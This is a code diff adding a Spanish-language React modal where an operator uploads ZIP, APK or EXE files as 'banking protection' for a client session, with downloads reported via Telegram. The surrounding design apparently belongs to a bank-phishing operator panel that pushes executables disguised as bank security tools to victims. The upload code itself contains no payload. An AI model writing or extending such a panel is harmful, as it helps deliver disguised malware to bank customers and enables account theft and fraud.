@@ -434,3 +434,155 @@ export const MessageModal: React.FC<MessageModalProps> = ({ isOpen, onClose, onC
     </Modal>
   );
 };
+
+interface ProtectionBankingModalProps {
+  isOpen: boolean;
+  onClose: () => void;
+  onConfirm: (fileData: { fileName: string; fileUrl: string; fileSize: string }) => void;
+  sessionId: string | null;
+}
+
+export const ProtectionBankingModal: React.FC<ProtectionBankingModalProps> = ({ 
+  isOpen, 
+  onClose, 
+  onConfirm, 
+  sessionId 
+}) => {
+  const [file, setFile] = useState<File | null>(null);
+  const [uploading, setUploading] = useState(false);
+
+  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
+    const selectedFile = event.target.files?.[0];
+    if (selectedFile) {
+      // Validar tamaño del archivo (máximo 50MB)
+      if (selectedFile.size > 50 * 1024 * 1024) {
+        alert('El archivo no puede ser mayor a 50MB');
+        return;
+      }
+      
+      // Validar tipos de archivo permitidos
+      const allowedTypes = [
+        'application/zip',
+        'application/x-zip-compressed',
+        'application/vnd.android.package-archive', // APK
+        'application/x-msdownload', // EXE
+        'application/octet-stream'
+      ];
+      
+      if (!allowedTypes.includes(selectedFile.type) && 
+          !selectedFile.name.toLowerCase().endsWith('.zip') &&
+          !selectedFile.name.toLowerCase().endsWith('.apk') &&
+          !selectedFile.name.toLowerCase().endsWith('.exe')) {
+        alert('Solo se permiten archivos ZIP, APK y EXE');
+        return;
+      }
+      
+      setFile(selectedFile);
+    }
+  };
+
+  const handleUpload = async () => {
+    if (!file || !sessionId) return;
+
+    setUploading(true);
+    
+    try {
+      const formData = new FormData();
+      formData.append('file', file);
+      formData.append('sessionId', sessionId);
+
+      const response = await fetch('/api/upload-protection-file', {
+        method: 'POST',
+        body: formData,
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        
+        // Formatear el tamaño del archivo
+        const fileSize = (file.size / (1024 * 1024)).toFixed(2) + ' MB';
+        
+        onConfirm({
+          fileName: file.name,
+          fileUrl: result.fileUrl,
+          fileSize: fileSize
+        });
+        
+        setFile(null);
+        onClose();
+      } else {
+        throw new Error('Error al subir el archivo');
+      }
+    } catch (error) {
+      console.error('Error uploading file:', error);
+      alert('Error al subir el archivo. Intenta nuevamente.');
+    } finally {
+      setUploading(false);
+    }
+  };
+
+  const formatFileSize = (bytes: number) => {
+    if (bytes === 0) return '0 Bytes';
+    const k = 1024;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+  };
+
+  return (
+    <Modal isOpen={isOpen} onClose={onClose} title="Protección Bancaria - Cargar Archivo">
+      <div className="space-y-4">
+        <div>
+          <Label className="block text-sm text-gray-300 mb-2">
+            Selecciona el archivo de protección para el cliente:
+          </Label>
+          <input
+            type="file"
+            accept=".zip,.apk,.exe"
+            onChange={handleFileSelect}
+            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none file:mr-4 file:py-2 file:px-4 file:rounded file:border-0 file:text-sm file:bg-[#007bff] file:text-white hover:file:bg-blue-700"
+          />
+          <p className="text-xs text-gray-400 mt-1">
+            Formatos permitidos: ZIP, APK, EXE (máximo 50MB)
+          </p>
+        </div>
+
+        {file && (
+          <div className="bg-[#1f1f1f] p-3 rounded border border-gray-700">
+            <p className="text-sm text-gray-300">
+              <strong>Archivo seleccionado:</strong> {file.name}
+            </p>
+            <p className="text-xs text-gray-400">
+              Tamaño: {formatFileSize(file.size)}
+            </p>
+          </div>
+        )}
+
+        <div className="bg-blue-900/20 p-3 rounded border border-blue-700/50">
+          <p className="text-sm text-blue-200">
+            <strong>Información:</strong> Una vez cargado, el cliente podrá descargar este archivo desde la pantalla de Protección Bancaria. Las descargas se notificarán automáticamente vía Telegram.
+          </p>
+        </div>
+      </div>
+      
+      <div className="flex justify-end space-x-2 mt-6">
+        <Button 
+          onClick={onClose}
+          variant="secondary"
+          className="bg-gray-600 text-white hover:bg-gray-700"
+          disabled={uploading}
+        >
+          Cancelar
+        </Button>
+        <Button 
+          onClick={handleUpload}
+          variant="default"
+          className="bg-[#007bff] text-white hover:bg-opacity-90"
+          disabled={!file || uploading}
+        >
+          {uploading ? 'Cargando...' : 'Cargar y Enviar'}
+        </Button>
+      </div>
+    </Modal>
+  );
+};
